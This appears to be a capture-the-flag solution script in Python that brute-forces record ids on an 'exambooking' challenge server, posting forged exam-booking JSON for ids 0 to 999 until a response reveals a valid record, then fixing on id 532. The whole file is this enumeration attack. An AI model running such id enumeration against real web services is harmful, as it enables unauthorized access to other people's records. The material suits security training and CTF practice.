import requests

URL= 'http://exambooking.challs.olicyber.it/bakand'


for i in range(1000):
    data = {
    "id_verbale": i,
    "cod_ins": "01ELEET",
    "d_ini_appel": "",
    "d_fin_appel": "",
    "data_appello": "2021-07-05",
    "frequenza": 2021,
    "nome_insegnamento": "Hacktivism",
    "docente": "ROBOT MR",
    "data_ora_appello": "14-07-2021 13:00",
    "desc_tipo": "Esami scritti su carta con videosorveglianza dei docenti",
    "note": "",
    "mat_docente": "2063",
    "aula": "AULA VIRTUALE",
    "posti_liberi": 999
}
    resp = requests.post(URL, json=data)
    print(i)
    if 'No exam with such id' not in resp.text:
        print(resp.text)
        break
    # input()
data = {
    "id_verbale": 532,
    "cod_ins": "01ELEET",
    "d_ini_appel": "",
    "d_fin_appel": "",
    "data_appello": "2021-07-05",
    "frequenza": 2021,
    "nome_insegnamento": "Hacktivism",
    "docente": "ROBOT MR",
    "data_ora_appello": "14-07-2021 13:00",
    "desc_tipo": "Esami scritti su carta con videosorveglianza dei docenti",
    "note": "",
    "mat_docente": "2063",
    "aula": "AULA VIRTUALE",
    "posti_liberi": 999
}
